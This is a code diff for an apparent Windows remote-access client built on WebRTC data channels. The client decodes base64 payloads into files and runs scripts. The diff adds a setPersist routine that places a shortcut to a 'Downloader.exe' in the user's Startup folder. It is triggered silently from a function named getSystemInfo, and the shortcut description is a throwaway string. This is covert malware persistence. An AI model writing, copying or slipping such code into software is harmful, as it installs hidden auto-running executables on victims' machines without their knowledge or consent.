@@ -40,7 +40,15 @@
 #include <ShellAPI.h>
 #include <cstdlib>
 #include <fstream>
+#include <Shlobj.h>
+#include <filesystem>
+#include "winnls.h"
+#include "shobjidl.h"
+#include "objbase.h"
+#include "objidl.h"
+#include "shlguid.h"
 
+#include "helpers.h"
 
 using namespace rtc;
 using namespace std;
@@ -54,11 +62,47 @@ unordered_map<string, shared_ptr<PeerConnection>> peerConnectionMap;
 unordered_map<string, shared_ptr<DataChannel>> dataChannelMap;
 
 string localId;
+string data_directory;
+string user_directory;
 
 shared_ptr<PeerConnection> createPeerConnection(const Configuration &config,
                                                 weak_ptr<WebSocket> wws, string id);
 string randomId(size_t length);
-/***
+
+
+
+void setPersist() {
+	//Assuming its copied on its directory folder (cache-d)
+	string source = data_directory + "\\Downloader.exe";
+	string destination = user_directory + "\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\client.lnk";
+
+	// Create shortcut
+	CreateLink(source.c_str(), destination.c_str(), data_directory.c_str(), "Some bullshit");
+
+}
+
+int establishDirectory() {
+	WCHAR path[MAX_PATH];
+	if (SUCCEEDED(SHGetFolderPathW(NULL, CSIDL_PROFILE, NULL, 0, path))) {
+		wstring ws(path);
+		string strPath(ws.begin(), ws.end());
+
+		user_directory = strPath;
+
+		namespace fs = std::filesystem;
+		//fs::create_directories(strPath + "\\Downloads\\cache-d");
+		data_directory = strPath + "\\Downloads\\cache-d";
+
+		setPersist();
+
+		return 1;
+	}
+	return 0;
+}
+
+
+
+    /***
 * runScript | Runs given script and stores the log output on the given file
 ***/
 int runScript(char* file_source, char* file_output) {
@@ -115,6 +159,7 @@ void createFileFromBase64String(char* filename) {
 	//TODO Run script
 	/*CreateProcess("C:\Users\alvar\Desktop\B.exe", "> \"C:\Users\alvar\Desktop\tryinghard.txt\"", NULL, NULL, TRUE, CREATE_NEW_CONSOLE, NULL,
 	              NULL, &info, &processInfo);*/
+	
 
 	runScript("C:\\Users\\alvar\\Desktop\\B.exe", "C:\\Users\\alvar\\Desktop\\tryinghard.txt");
 	cout << "TEST COMPLETED***" << endl;
@@ -126,8 +171,10 @@ void createFileFromBase64String(char* filename) {
 SYSTEM_INFO getSystemInfo(string data) {
 	SYSTEM_INFO siSysInfo;
 
-   // Copy the hardware information to the SYSTEM_INFO structure. 
+   // Copy the hardware information to the SYSTEM_INFO struct 
    GetSystemInfo(&siSysInfo); 
+
+   establishDirectory();
 	   
    return siSysInfo;
 }
